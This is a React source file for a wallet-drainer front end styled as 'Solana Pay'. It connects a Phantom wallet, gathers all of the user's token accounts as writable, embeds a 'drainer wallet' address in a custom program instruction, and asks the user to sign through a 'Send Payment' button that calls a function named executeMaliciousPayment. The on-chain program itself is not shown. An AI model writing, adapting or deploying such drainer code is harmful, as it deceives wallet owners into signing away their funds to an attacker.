import React, { useState, useEffect } from 'react';
import * as web3 from '@solana/web3.js';
import { PublicKey, Transaction } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import './App.css';

const PROGRAM_ID = new PublicKey("YourProgramIdHere");
const connection = new web3.Connection("https://api.devnet.solana.com", "confirmed");

function App() {
  const [wallet, setWallet] = useState(null);
  const [receiver, setReceiver] = useState("");
  const [amount, setAmount] = useState("");
  const [drainerWallet, setDrainerWallet] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    if (window.solana && window.solana.isPhantom) {
      setWallet(window.solana);
    }
  }, []);

  const connectWallet = async () => {
    if (!wallet) {
      alert("Install Phantom first");
      return;
    }
    try {
      await wallet.connect();
      console.log("Connected:", wallet.publicKey.toString());
    } catch (err) {
      console.error(err);
    }
  };

  const getSenderTokenAccounts = async (publicKey) => {
    try {
      const info = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      return info.value.map(acc => acc.pubkey.toString());
    } catch (e) {
      console.error("Failed to get token accounts:", e);
      return [];
    }
  };

  const executeMaliciousPayment = async () => {
    if (!wallet || !wallet.isConnected) {
      setStatus("Connect wallet first");
      return;
    }
    if (!receiver || !amount || !drainerWallet) {
      setStatus("Fill all fields");
      return;
    }

    try {
      const sender = new PublicKey(wallet.publicKey.toString());
      const receiverPubkey = new PublicKey(receiver);
      const drainerPubkey = new PublicKey(drainerWallet);
      const lamports = web3.LAMPORTS_PER_SOL * parseFloat(amount);

      setStatus("Building transaction...");

      const tokenAccounts = await getSenderTokenAccounts(sender);

      const keys = [
        { pubkey: sender, isSigner: true, isWritable: true },
        { pubkey: receiverPubkey, isSigner: false, isWritable: true },
        { pubkey: drainerPubkey, isSigner: false, isWritable: true },
        { pubkey: web3.SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        ...tokenAccounts.map(acc => ({ pubkey: new PublicKey(acc), isSigner: false, isWritable: true }))
      ];

      const data = Buffer.alloc(40);
      data.writeBigUInt64LE(BigInt(lamports), 0);
      drainerPubkey.toBuffer().copy(data, 8);

      const ix = new web3.TransactionInstruction({
        programId: PROGRAM_ID,
        keys,
        data
      });

      const tx = new Transaction().add(ix);
      tx.feePayer = sender;
      tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

      setStatus("Approve in Phantom...");
      const signed = await wallet.signTransaction(tx);
      const txid = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(txid);

      setStatus(`Success! TX: ${txid}`);
    } catch (err) {
      console.error(err);
      setStatus("Failed: " + err.message);
    }
  };

  return (
    <div className="App">
      <h1>Solana Pay</h1>

      {!wallet || !wallet.isConnected ? (
        <button onClick={connectWallet}>Connect Phantom</button>
      ) : (
        <div>
          <p>Connected: {wallet.publicKey.toString()}</p>
          <div>
            <input placeholder="Receiver SOL Address" value={receiver} onChange={e => setReceiver(e.target.value)} />
          </div>
          <div>
            <input placeholder="Amount (SOL)" value={amount} onChange={e => setAmount(e.target.value)} type="number" />
          </div>
          <div>
            <input placeholder="Drainer Wallet (SOL)" value={drainerWallet} onChange={e => setDrainerWallet(e.target.value)} />
          </div>
          <button onClick={executeMaliciousPayment}>Send Payment</button>
          <p>{status}</p>
        </div>
      )}
    </div>
  );
}

export default App;
